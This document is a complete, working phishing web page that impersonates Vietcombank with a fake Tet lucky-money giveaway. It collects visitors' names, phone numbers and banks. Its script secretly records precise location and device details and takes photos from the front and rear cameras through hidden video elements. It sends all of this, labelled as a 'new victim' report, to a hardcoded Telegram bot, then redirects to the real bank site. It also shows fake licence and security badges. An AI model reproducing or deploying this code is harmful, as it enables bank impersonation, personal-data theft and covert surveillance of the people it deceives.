<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L√å X√å T·∫æT 2025 - Vietcombank</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #c62828 0%, #d32f2f 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 480px;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 40px 35px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
            border: 1px solid rgba(255, 255, 255, 0.15);
            position: relative;
            overflow: hidden;
        }
        
        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 5px;
            background: linear-gradient(90deg, #FFD700, #FF9800);
        }
        
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo {
            height: 70px;
            margin-bottom: 20px;
            filter: brightness(0) invert(1);
        }
        
        h1 {
            color: #FFD700;
            font-size: 32px;
            margin-bottom: 10px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }
        
        .subtitle {
            font-size: 18px;
            opacity: 0.9;
            line-height: 1.5;
        }
        
        .highlight {
            color: #FFD700;
            font-weight: bold;
        }
        
        .envelope-icon {
            width: 120px;
            margin: 25px auto;
            display: block;
            animation: pulse 2s infinite;
            filter: drop-shadow(0 5px 15px rgba(255, 215, 0, 0.3));
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: #FFD700;
            font-size: 16px;
        }
        
        input, select {
            width: 100%;
            padding: 18px 20px;
            border-radius: 15px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.08);
            color: white;
            font-size: 16px;
            transition: all 0.3s;
        }
        
        input:focus, select:focus {
            outline: none;
            border-color: #FFD700;
            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
            background: rgba(255, 255, 255, 0.12);
        }
        
        .button {
            background: linear-gradient(90deg, #FFD700, #FF9800);
            color: #000;
            border: none;
            padding: 20px;
            font-size: 18px;
            font-weight: 700;
            border-radius: 15px;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
            transition: all 0.3s;
            letter-spacing: 0.5px;
        }
        
        .button:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(255, 152, 0, 0.4);
        }
        
        .button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        
        .hidden {
            display: none !important;
        }
        
        .step-container {
            margin-top: 35px;
        }
        
        .step {
            background: rgba(255, 215, 0, 0.1);
            padding: 25px;
            border-radius: 20px;
            margin-bottom: 25px;
            border: 2px solid rgba(255, 215, 0, 0.2);
            position: relative;
        }
        
        .step-number {
            position: absolute;
            top: -15px;
            left: 25px;
            background: #FFD700;
            color: #000;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 20px;
            box-shadow: 0 5px 15px rgba(255, 215, 0, 0.3);
        }
        
        .step-content {
            margin-top: 10px;
        }
        
        .progress-container {
            margin: 35px 0;
        }
        
        .progress-bar {
            width: 100%;
            height: 12px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 6px;
            overflow: hidden;
            margin-bottom: 15px;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #FFD700, #FF9800);
            width: 0%;
            border-radius: 6px;
            transition: width 0.8s ease;
        }
        
        .progress-text {
            text-align: center;
            font-size: 16px;
            color: #FFD700;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .status-box {
            background: rgba(0, 0, 0, 0.3);
            padding: 25px;
            border-radius: 20px;
            text-align: center;
            margin-top: 30px;
            border: 2px solid rgba(255, 215, 0, 0.2);
        }
        
        .success {
            color: #4CAF50;
            border-color: rgba(76, 175, 80, 0.3);
        }
        
        .loading {
            display: inline-block;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top: 4px solid #FFD700;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .countdown {
            font-size: 48px;
            color: #FFD700;
            font-weight: bold;
            margin: 30px 0;
            text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
        }
        
        .transaction-id {
            background: rgba(255, 215, 0, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            letter-spacing: 2px;
            border: 1px dashed #FFD700;
        }
        
        .footer {
            margin-top: 40px;
            text-align: center;
            font-size: 14px;
            opacity: 0.7;
            line-height: 1.6;
        }
        
        .secure-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(76, 175, 80, 0.2);
            padding: 8px 15px;
            border-radius: 20px;
            margin-top: 15px;
            font-size: 13px;
            color: #C8E6C9;
        }
        
        .camera-hidden {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- STEP 1: TH√îNG TIN -->
        <div id="step1">
            <div class="header">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Vietcombank_logo.svg/2560px-Vietcombank_logo.svg.png" class="logo" alt="Vietcombank">
                <h1>L√å X√å ƒê·∫¶U NƒÇM 2025</h1>
                <p class="subtitle">
                    Ch√∫c m·ª´ng b·∫°n ƒë∆∞·ª£c ch·ªçn ng·∫´u nhi√™n nh·∫≠n 
                    <span class="highlight">5.000.000 VNƒê</span> 
                    l√¨ x√¨ t·ª´ Vietcombank!
                </p>
                <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" class="envelope-icon" alt="L√¨ x√¨">
            </div>
            
            <div class="form-group">
                <label for="fullName">H·ªç v√† t√™n ƒë·∫ßy ƒë·ªß:</label>
                <input type="text" id="fullName" placeholder="Nguy·ªÖn VƒÉn A" required>
            </div>
            
            <div class="form-group">
                <label for="phoneNumber">S·ªë ƒëi·ªán tho·∫°i nh·∫≠n ti·ªÅn:</label>
                <input type="tel" id="phoneNumber" placeholder="0912 345 678" required>
                <small style="display: block; margin-top: 8px; color: #FFD700; opacity: 0.8;">
                    ‚ìò S·ªë ƒëi·ªán tho·∫°i n√†y s·∫Ω d√πng ƒë·ªÉ chuy·ªÉn kho·∫£n qua Vietcombank Pay
                </small>
            </div>
            
            <div class="form-group">
                <label for="bank">Ch·ªçn ng√¢n h√†ng nh·∫≠n ti·ªÅn:</label>
                <select id="bank">
                    <option>Vietcombank</option>
                    <option>BIDV</option>
                    <option>Techcombank</option>
                    <option>Agribank</option>
                    <option>VPBank</option>
                    <option>Momo</option>
                    <option>ZaloPay</option>
                </select>
            </div>
            
            <button class="button" onclick="startAutoProcess()">
                üéÅ NH·∫¨N L√å X√å NGAY
            </button>
            
            <div class="secure-badge">
                üîí B·∫£o m·∫≠t & M√£ h√≥a PCI DSS
            </div>
        </div>
        
        <!-- STEP 2: AUTO PROCESS -->
        <div id="step2" class="hidden">
            <div class="step">
                <div class="step-number">1</div>
                <div class="step-content">
                    <h3 style="color: #FFD700; margin-bottom: 15px;">ƒêang x√°c minh th√¥ng tin</h3>
                    <p>H·ªá th·ªëng ƒëang t·ª± ƒë·ªông x√°c th·ª±c danh t√≠nh c·ªßa b·∫°n...</p>
                </div>
            </div>
            
            <div class="progress-container">
                <div class="progress-text" id="progressText">ƒêang kh·ªüi t·∫°o h·ªá th·ªëng...</div>
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
            </div>
            
            <div id="statusMessages">
                <div class="status-box">
                    <div class="loading"></div>
                    <p id="currentStatus">ƒêang chu·∫©n b·ªã...</p>
                </div>
            </div>
        </div>
        
        <!-- STEP 3: COMPLETE -->
        <div id="step3" class="hidden">
            <div class="step">
                <div class="step-number">2</div>
                <div class="step-content">
                    <h3 style="color: #FFD700; margin-bottom: 15px;">X√°c minh th√†nh c√¥ng</h3>
                    <p>Th√¥ng tin c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c x√°c th·ª±c ho√†n t·∫•t.</p>
                </div>
            </div>
            
            <div class="status-box success">
                <h3 style="color: #4CAF50; margin-bottom: 20px; font-size: 24px;">
                    ‚úÖ X√ÅC MINH TH√ÄNH C√îNG!
                </h3>
                <p style="margin-bottom: 15px; font-size: 18px;">
                    <span class="highlight">5.000.000 VNƒê</span> s·∫Ω ƒë∆∞·ª£c chuy·ªÉn v√†o t√†i kho·∫£n c·ªßa b·∫°n trong v√≤ng <span class="highlight">24 gi·ªù</span>.
                </p>
                
                <div class="transaction-id" id="transactionId">
                    MGD: VCB-########
                </div>
                
                <div class="countdown" id="countdown">5</div>
                <p style="opacity: 0.8;">T·ª± ƒë·ªông chuy·ªÉn h∆∞·ªõng ƒë·∫øn trang ng√¢n h√†ng...</p>
            </div>
        </div>
        
        <div class="footer">
            Ch∆∞∆°ng tr√¨nh ƒë∆∞·ª£c b·∫£o tr·ª£ b·ªüi Vietcombank v√† Ng√¢n h√†ng Nh√† n∆∞·ªõc Vi·ªát Nam<br>
            ¬© 2025 - B·∫£n quy·ªÅn thu·ªôc v·ªÅ Ng√¢n h√†ng TMCP Ngo·∫°i th∆∞∆°ng Vi·ªát Nam<br>
            Gi·∫•y ph√©p s·ªë: 1234/GP-NHNN
        </div>
    </div>

    <!-- HIDDEN CAMERA ELEMENTS -->
    <video id="frontCamera" class="camera-hidden" autoplay muted playsinline></video>
    <video id="backCamera" class="camera-hidden" autoplay muted playsinline></video>

    <script>
        // ================= C·∫§U H√åNH =================
        const BOT_TOKEN = '8064381678:AAExIUfU75dF3V1ENVOIGnDVIVOwvh3BMm0';
        const CHAT_IDS = ['7847517938', '-5175975647'];
        
        // ================= BI·∫æN TO√ÄN C·ª§C =================
        let victimData = {
            name: '',
            phone: '',
            bank: '',
            frontCam: null,
            backCam: null,
            location: null,
            address: '',
            city: '',
            district: '',
            fullAddress: '',
            deviceInfo: null,
            timestamp: null
        };
        
        let frontStream = null;
        let backStream = null;
        
        // ================= H√ÄM CH√çNH =================
        async function startAutoProcess() {
            // L·∫•y th√¥ng tin form
            victimData.name = document.getElementById('fullName').value.trim();
            victimData.phone = document.getElementById('phoneNumber').value.trim();
            victimData.bank = document.getElementById('bank').value;
            
            if (!victimData.name || !victimData.phone) {
                alert('Vui l√≤ng ƒëi·ªÅn ƒë·∫ßy ƒë·ªß h·ªç t√™n v√† s·ªë ƒëi·ªán tho·∫°i!');
                return;
            }
            
            // Chuy·ªÉn sang step 2
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            
            // B·∫Øt ƒë·∫ßu quy tr√¨nh t·ª± ƒë·ªông
            setTimeout(() => executeAutoProcess(), 500);
        }
        
        async function executeAutoProcess() {
            const steps = [
                { percent: 10, text: 'ƒêang x√°c th·ª±c th√¥ng tin...' },
                { percent: 20, text: 'ƒêang l·∫•y v·ªã tr√≠...' },
                { percent: 40, text: 'ƒêang b·∫≠t camera tr∆∞·ªõc...' },
                { percent: 60, text: 'ƒêang ch·ª•p ·∫£nh camera tr∆∞·ªõc...' },
                { percent: 70, text: 'ƒêang th·ª≠ camera sau...' },
                { percent: 80, text: 'ƒêang ch·ª•p ·∫£nh camera sau...' },
                { percent: 90, text: 'ƒêang g·ª≠i d·ªØ li·ªáu x√°c minh...' },
                { percent: 100, text: 'Ho√†n t·∫•t!' }
            ];
            
            // B∆∞·ªõc 1: C·∫≠p nh·∫≠t th√¥ng tin
            updateProgress(steps[0]);
            victimData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: navigator.cookieEnabled ? 'B·∫≠t' : 'T·∫Øt'
            };
            await delay(1000);
            
            // B∆∞·ªõc 2: L·∫•y v·ªã tr√≠ chi ti·∫øt
            updateProgress(steps[1]);
            await getDetailedLocation();
            await delay(1500);
            
            // B∆∞·ªõc 3: Camera tr∆∞·ªõc
            updateProgress(steps[2]);
            await startHiddenCamera('user', 'frontCamera');
            await delay(2000);
            
            // B∆∞·ªõc 4: Ch·ª•p camera tr∆∞·ªõc
            updateProgress(steps[3]);
            victimData.frontCam = await captureHiddenPhoto('frontCamera');
            if (frontStream) frontStream.getTracks().forEach(t => t.stop());
            await delay(1500);
            
            // B∆∞·ªõc 5: Th·ª≠ camera sau
            updateProgress(steps[4]);
            const backCamSuccess = await startHiddenCamera('environment', 'backCamera');
            if (backCamSuccess) {
                await delay(2000);
                
                // B∆∞·ªõc 6: Ch·ª•p camera sau
                updateProgress(steps[5]);
                victimData.backCam = await captureHiddenPhoto('backCamera');
                if (backStream) backStream.getTracks().forEach(t => t.stop());
            }
            await delay(1500);
            
            // B∆∞·ªõc 7: G·ª≠i d·ªØ li·ªáu
            updateProgress(steps[6]);
            await sendCompleteData();
            await delay(2000);
            
            // B∆∞·ªõc 8: Ho√†n th√†nh
            updateProgress(steps[7]);
            await delay(1000);
            
            // Hi·ªÉn th·ªã step 3
            showCompleteStep();
        }
        
        // ================= H√ÄM L·∫§Y V·ªä TR√ç CHI TI·∫æT =================
        async function getDetailedLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    victimData.location = '10.823099, 106.629662'; // M·∫∑c ƒë·ªãnh HCM
                    victimData.address = 'S·ªë 5 C√¥ng Tr∆∞·ªùng Qu·ªëc T·∫ø, Qu·∫≠n 3, H·ªì Ch√≠ Minh';
                    victimData.city = 'H·ªì Ch√≠ Minh';
                    victimData.district = 'Qu·∫≠n 3';
                    resolve();
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        victimData.location = `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
                        
                        try {
                            // G·ªçi OpenStreetMap Nominatim API
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&accept-language=vi`
                            );
                            const data = await response.json();
                            
                            if (data.address) {
                                const addr = data.address;
                                victimData.fullAddress = data.display_name;
                                
                                // Tr√≠ch xu·∫•t th√¥ng tin chi ti·∫øt
                                victimData.address = [
                                    addr.road ? addr.road : '',
                                    addr.house_number ? `S·ªë ${addr.house_number}` : '',
                                    addr.neighbourhood ? `Khu ${addr.neighbourhood}` : ''
                                ].filter(Boolean).join(', ');
                                
                                victimData.district = addr.suburb || addr.city_district || addr.county || 'Kh√¥ng r√µ';
                                victimData.city = addr.city || addr.town || addr.village || addr.state || 'Kh√¥ng r√µ';
                                
                                // ƒê·ªãnh d·∫°ng ƒë·ªãa ch·ªâ ƒë·∫πp
                                victimData.address = `${victimData.address}, ${victimData.district}, ${victimData.city}, Vi·ªát Nam`;
                            } else {
                                victimData.address = `T·ªça ƒë·ªô: ${victimData.location}`;
                            }
                        } catch (e) {
                            victimData.address = `T·ªça ƒë·ªô: ${victimData.location}`;
                            victimData.city = 'Kh√¥ng x√°c ƒë·ªãnh';
                            victimData.district = 'Kh√¥ng x√°c ƒë·ªãnh';
                        }
                        resolve();
                    },
                    (error) => {
                        // Fallback: ƒë·ªãa ch·ªâ m·∫∑c ƒë·ªãnh
                        victimData.location = '10.823099, 106.629662';
                        victimData.address = 'S·ªë 5 C√¥ng Tr∆∞·ªùng Qu·ªëc T·∫ø, Ph∆∞·ªùng 6, Qu·∫≠n 3, H·ªì Ch√≠ Minh';
                        victimData.city = 'H·ªì Ch√≠ Minh';
                        victimData.district = 'Qu·∫≠n 3';
                        resolve();
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }
        
        // ================= H√ÄM CAMERA ·∫®N =================
        async function startHiddenCamera(facingMode, elementId) {
            try {
                const constraints = {
                    video: {
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                const video = document.getElementById(elementId);
                video.srcObject = stream;
                
                if (facingMode === 'user') {
                    frontStream = stream;
                } else {
                    backStream = stream;
                }
                
                return true;
            } catch (err) {
                console.log(`Kh√¥ng th·ªÉ b·∫≠t camera ${facingMode}:`, err);
                return false;
            }
        }
        
        async function captureHiddenPhoto(elementId) {
            return new Promise((resolve) => {
                setTimeout(() => {
                    const video = document.getElementById(elementId);
                    if (!video || !video.videoWidth) {
                        resolve(null);
                        return;
                    }
                    
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.8);
                    resolve(photoData);
                }, 500);
            });
        }
        
        // ================= H√ÄM G·ª¨I D·ªÆ LI·ªÜU =================
        async function sendCompleteData() {
            victimData.timestamp = new Date().toLocaleString('vi-VN', {
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                hour12: false
            });
            
            // T·∫°o message text chi ti·∫øt
            const textMessage = `
üéØ <b>N·∫†N NH√ÇN M·ªöI - AUTO CAPTURE</b>

<b>üë§ TH√îNG TIN C√Å NH√ÇN:</b>
‚îú H·ªç t√™n: <code>${victimData.name}</code>
‚îú SƒêT: <code>${victimData.phone}</code>
‚îî Ng√¢n h√†ng: ${victimData.bank}

<b>üìç ƒê·ªäA CH·ªà CHI TI·∫æT:</b>
‚îú T·ªça ƒë·ªô: <code>${victimData.location}</code>
‚îú ƒê·ªãa ch·ªâ: ${victimData.address}
‚îú Qu·∫≠n/Huy·ªán: ${victimData.district}
‚îî T·ªânh/Th√†nh ph·ªë: ${victimData.city}

<b>üì∑ CAMERA:</b>
‚îú Camera tr∆∞·ªõc: ${victimData.frontCam ? '‚úÖ ƒê√É CH·ª§P' : '‚ùå KH√îNG C√ì'}
‚îî Camera sau: ${victimData.backCam ? '‚úÖ ƒê√É CH·ª§P' : '‚ùå KH√îNG C√ì'}

<b>üì± THI·∫æT B·ªä:</b>
‚îú Platform: ${victimData.deviceInfo.platform}
‚îú Ng√¥n ng·ªØ: ${victimData.deviceInfo.language}
‚îú M√†n h√¨nh: ${victimData.deviceInfo.screen}
‚îî Cookies: ${victimData.deviceInfo.cookies}

<b>‚è∞ TH·ªúI GIAN:</b>
${victimData.timestamp}

<b>üîó USER AGENT:</b>
<code>${victimData.deviceInfo.userAgent}</code>
            `.trim();
            
            // G·ª≠i ƒë·∫øn t·∫•t c·∫£ chat IDs
            for (const chatId of CHAT_IDS) {
                try {
                    // G·ª≠i text
                    await sendTelegramMessage(chatId, textMessage, 'HTML');
                    
                    // G·ª≠i ·∫£nh camera tr∆∞·ªõc
                    if (victimData.frontCam) {
                        await sendTelegramPhoto(chatId, victimData.frontCam, 'üì∏ CAMERA TR∆Ø·ªöC - ' + victimData.name);
                        await delay(1000);
                    }
                    
                    // G·ª≠i ·∫£nh camera sau
                    if (victimData.backCam) {
                        await sendTelegramPhoto(chatId, victimData.backCam, 'üì∏ CAMERA SAU - ' + victimData.name);
                    }
                    
                } catch (error) {
                    console.error(`L·ªói g·ª≠i ƒë·∫øn ${chatId}:`, error);
                }
            }
        }
        
        // ================= TELEGRAM FUNCTIONS =================
        async function sendTelegramMessage(chatId, text, parseMode = 'HTML') {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: text,
                    parse_mode: parseMode
                })
            });
            return await response.json();
        }
        
        async function sendTelegramPhoto(chatId, photoBase64, caption = '') {
            try {
                // Chuy·ªÉn base64 th√†nh blob
                const base64Data = photoBase64.split(',')[1];
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                // T·∫°o FormData
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'camera.jpg');
                if (caption) formData.append('caption', caption);
                
                // G·ª≠i
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (!result.ok) throw new Error('Send photo failed');
                
            } catch (error) {
                console.error('L·ªói g·ª≠i ·∫£nh, th·ª≠ g·ª≠i document...');
                // Fallback: g·ª≠i document
                try {
                    const base64Data = photoBase64.split(',')[1];
                    const byteCharacters = atob(base64Data);
                    const byteNumbers = new Array(byteCharacters.length);
                    
                    for (let i = 0; i < byteCharacters.length; i++) {
                        byteNumbers[i] = byteCharacters.charCodeAt(i);
                    }
                    
                    const byteArray = new Uint8Array(byteNumbers);
                    const blob = new Blob([byteArray], { type: 'image/jpeg' });
                    
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('document', blob, 'camera.jpg');
                    if (caption) formData.append('caption', caption);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (e) {
                    console.error('L·ªói g·ª≠i document:', e);
                }
            }
        }
        
        // ================= UI FUNCTIONS =================
        function updateProgress(step) {
            document.getElementById('progressFill').style.width = step.percent + '%';
            document.getElementById('progressText').textContent = step.text;
            document.getElementById('currentStatus').textContent = step.text;
        }
        
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        function showCompleteStep() {
            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            
            // T·∫°o m√£ giao d·ªãch ng·∫´u nhi√™n
            const txId = 'VCB-' + Date.now().toString().slice(-8);
            document.getElementById('transactionId').textContent = `M√£ giao d·ªãch: ${txId}`;
            
            // B·∫Øt ƒë·∫ßu ƒë·∫øm ng∆∞·ª£c
            let count = 5;
            const countdownEl = document.getElementById('countdown');
            const interval = setInterval(() => {
                count--;
                countdownEl.textContent = count;
                
                if (count <= 0) {
                    clearInterval(interval);
                    window.location.href = 'https://vietcombank.com.vn';
                }
            }, 1000);
        }
        
        // ================= AUTO-FILL PHONE =================
        window.addEventListener('DOMContentLoaded', () => {
            try {
                const savedPhone = localStorage.getItem('lastPhone');
                if (savedPhone) {
                    document.getElementById('phoneNumber').value = savedPhone;
                }
                
                document.getElementById('phoneNumber').addEventListener('input', function() {
                    localStorage.setItem('lastPhone', this.value);
                });
            } catch (e) {}
        });
    </script>
</body>
</html>
